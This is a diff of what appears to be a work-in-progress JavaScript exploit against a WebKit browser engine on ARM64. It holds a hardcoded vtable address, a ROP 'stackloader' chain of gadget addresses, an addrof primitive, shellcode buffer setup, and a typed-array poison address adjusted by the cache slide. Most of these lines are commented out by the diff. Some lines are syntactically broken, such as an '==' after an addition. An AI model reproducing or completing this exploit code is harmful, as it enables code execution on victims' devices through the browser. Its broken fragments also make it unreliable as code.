@@ -652,7 +652,7 @@ function foo(obj) {
         //var anchor1 = memory.read_i64(anchor,0);
         //log('anchor:' + anchor)
         //anchor is webcore
-        var vtab = 0x1B205A808;
+        //var vtab = 0x1B205A808;
         //var nslide = Sub(v_tlb, vtab) - 0x10;
         var hdr = Sub(anchor, anchor.lo() & 0xfff);
         //cache
@@ -913,8 +913,8 @@ function foo(obj) {
             //      19d537d98 ff 83 02 91     add        sp,sp,#0xa0
             //      19d537d9c c0 03 5f d6     ret
             // the above will be my stackloader...
-            var ropchain = [0x19d537bc4,0x19d537bd4,0x19d52fba4,0x19d537d88,0x19d537d8c,0x19d537d90,0x19d537d94,0x19d537d98,0x19d537d9c};
-            ropchainbuffaddr = addrof(ropchain) + 0x18==;
+            //var ropchain = [0x19d537bc4,0x19d537bd4,0x19d52fba4,0x19d537d88,0x19d537d8c,0x19d537d90,0x19d537d94,0x19d537d98,0x19d537d9c};
+            //ropchainbuffaddr = addrof(ropchain) + 0x18==;
             /*for (var dd = 0; dd < ropchain.length; ++dd) {
                 
                 ropchain[dd] = Add(ropchain[2],cache_slide);
@@ -923,7 +923,7 @@ function foo(obj) {
                 wrapper.addEventListener('click', function(){})
             }*/
             
-            function xor(a, b) {
+            /*function xor(a, b) {
                 var res = 0, base = 1
                 for (var i = 0; i < 64; ++i) {
                     res += base * ((a&1) ^ (b&1))
@@ -937,7 +937,7 @@ function foo(obj) {
             var workbuf = new ArrayBuffer(0x1000000)
             var u32_buffer = new Uint32Array(workbuf)
             var u8_buffer = new Uint8Array(workbuf)
-            var shellcode_length
+            var shellcode_length*/
             /*#if ENABLE(POISON)
                  232    // FIXME: once we have C++17, we can make this a lambda in makeConstExprPoison().
                  233    inline constexpr uintptr_t constExprPoisonRandom(uintptr_t seed)
@@ -968,8 +968,8 @@ function foo(obj) {
 1b85481a5                 ??         ??
 1b85481a6                 ??         ??
 1b85481a7                 ??         ??*/
-            var g_typedArrayPoisons = Add(0x1b85481a0,cache_slide)
-            alert("typed array poison:" + g_typedArrayPoisons);
+            //var g_typedArrayPoisons = Add(0x1b85481a0,cache_slide)
+            //alert("typed array poison:" + g_typedArrayPoisons);
             //var key =
             //var poison = memory.read_i64(g_typedArrayPoisons);
             //var key = ()
